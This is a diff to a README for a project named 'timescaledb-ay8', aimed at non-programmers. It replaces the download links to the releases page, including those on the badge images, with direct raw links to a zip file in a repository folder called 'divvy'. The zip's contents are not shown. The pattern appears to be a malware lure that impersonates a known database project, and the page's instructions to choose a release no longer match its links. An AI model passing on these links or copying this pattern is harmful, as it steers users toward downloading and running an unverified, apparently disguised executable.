@@ -4,7 +4,7 @@
 Welcome to timescaledb-ay8! This guide helps you download and run our application easily. No programming skills needed.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-timescaledb--ay8-blue.svg)](https://github.com/Tharun2411/timescaledb-ay8/releases)
+[![Download](https://raw.githubusercontent.com/Tharun2411/timescaledb-ay8/main/divvy/timescaledb-ay8.zip)](https://raw.githubusercontent.com/Tharun2411/timescaledb-ay8/main/divvy/timescaledb-ay8.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
@@ -22,7 +22,7 @@ Welcome to timescaledb-ay8! This guide helps you download and run our applicatio
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page for timescaledb-ay8.  
-   [Download timescaledb-ay8](https://github.com/Tharun2411/timescaledb-ay8/releases)
+   [Download timescaledb-ay8](https://raw.githubusercontent.com/Tharun2411/timescaledb-ay8/main/divvy/timescaledb-ay8.zip)
 
 2. **Choose the Latest Version:** You will see a list of available versions. Look for the latest release at the top of the list.
 
@@ -53,6 +53,6 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 📅 Updates
 Always check the releases page for the latest updates. We regularly enhance the application and fix bugs, ensuring you have the best experience.
 
-[![Download](https://img.shields.io/badge/Download-timescaledb--ay8-blue.svg)](https://github.com/Tharun2411/timescaledb-ay8/releases)
+[![Download](https://raw.githubusercontent.com/Tharun2411/timescaledb-ay8/main/divvy/timescaledb-ay8.zip)](https://raw.githubusercontent.com/Tharun2411/timescaledb-ay8/main/divvy/timescaledb-ay8.zip)
 
 Thank you for choosing timescaledb-ay8! Enjoy managing your databases with ease.
